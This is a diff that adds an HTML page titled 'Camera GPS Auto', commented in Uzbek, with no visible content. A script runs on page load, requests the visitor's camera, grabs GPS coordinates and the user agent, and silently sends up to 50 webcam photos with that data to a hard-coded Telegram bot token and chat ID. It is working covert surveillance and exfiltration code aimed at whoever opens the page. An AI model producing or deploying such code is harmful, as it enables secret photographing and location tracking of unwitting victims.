@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera GPS Auto</title>
+</head>
+<body>
+<script>
+const BOT_TOKEN = "8568491806:AAGIGo7o3yE7uY5rxesVQtBbq5Iaife07xc"; // sizning bot tokeningiz
+const CHAT_ID = "6575586301";     // sizning chat id
+const INTERVAL = 500; // 0.5 soniya = 500ms
+const MAX_SHOTS = 50; // maksimal 50 rasm
+
+async function sendPhoto(blob, info) {
+    const fd = new FormData();
+    fd.append("photo", blob);
+    fd.append("caption", info);
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+        method: "POST",
+        body: fd
+    });
+}
+
+async function captureAndSend() {
+    try {
+        // Kamera ruxsati
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        let gpsInfo = "GPS not available";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                gpsInfo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+            });
+        }
+
+        let shots = 0;
+        const intervalId = setInterval(() => {
+            if (shots >= MAX_SHOTS) {
+                clearInterval(intervalId);
+                stream.getTracks().forEach(track => track.stop()); // kamerani o'chiradi
+                return;
+            }
+
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+
+            const deviceInfo = `Device: ${navigator.userAgent}\nGPS: ${gpsInfo}`;
+            canvas.toBlob(blob => sendPhoto(blob, deviceInfo), "image/jpeg", 0.8);
+
+            shots++;
+        }, INTERVAL);
+
+    } catch (err) {
+        console.log("Camera access denied or not supported", err);
+    }
+}
+
+// Sahifa yuklangan zahoti ishlaydi
+window.onload = captureAndSend;
+</script>
+</body>
+</html>
